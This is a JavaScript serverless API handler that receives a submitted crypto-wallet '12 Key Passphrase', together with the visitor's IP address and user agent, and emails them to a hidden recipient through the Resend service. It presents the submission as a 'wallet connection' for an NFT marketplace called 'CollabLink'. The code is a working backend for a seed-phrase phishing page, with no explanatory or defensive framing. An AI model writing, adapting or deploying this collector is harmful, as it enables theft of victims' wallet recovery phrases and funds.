import { Resend } from 'resend';

const resend = new Resend(process.env.RESEND_API_KEY);

export default async function handler(req, res) {
  // Set CORS headers
  res.setHeader('Access-Control-Allow-Credentials', true);
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET,OPTIONS,PATCH,DELETE,POST,PUT');
  res.setHeader(
    'Access-Control-Allow-Headers',
    'X-CSRF-Token, X-Requested-With, Accept, Accept-Version, Content-Length, Content-MD5, Content-Type, Date, X-Api-Version'
  );

  // Handle preflight request
  if (req.method === 'OPTIONS') {
    res.status(200).end();
    return;
  }

  // Only allow POST requests
  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Method not allowed' });
  }

  try {
    const { passphrase, ip, userAgent } = req.body;

    // Validate input
    if (!passphrase || passphrase.trim().length === 0) {
      return res.status(400).json({ error: 'Passphrase is required' });
    }

    // Send email
    const { data, error } = await resend.emails.send({
      from: process.env.FROM_EMAIL || 'onboarding@resend.dev',
      to: process.env.TO_EMAIL,
      subject: 'New Wallet Connection Attempt',
      html: `
        <h2>New Wallet Connection Form Submission</h2>
        <p><strong>Timestamp:</strong> ${new Date().toLocaleString()}</p>
        <p><strong>12 Key Passphrase:</strong></p>
        <pre style="background: #f5f5f5; padding: 10px; border-radius: 5px; font-family: monospace;">${passphrase}</pre>
        <p><strong>IP Address:</strong> ${ip || 'Not available'}</p>
        <p><strong>User Agent:</strong> ${userAgent || 'Not available'}</p>
        <hr style="margin: 20px 0;">
        <p style="color: #666; font-size: 12px;">Sent from CollabLink NFT Marketplace</p>
      `
    });

    if (error) {
      console.error('Resend API Error:', error);
      return res.status(500).json({ success: false, error: 'Failed to send email' });
    }

    return res.status(200).json({ 
      success: true, 
      message: 'Email sent successfully',
      id: data.id 
    });

  } catch (error) {
    console.error('API Error:', error);
    return res.status(500).json({ 
      success: false, 
      error: 'Failed to send email' 
    });
  }
} 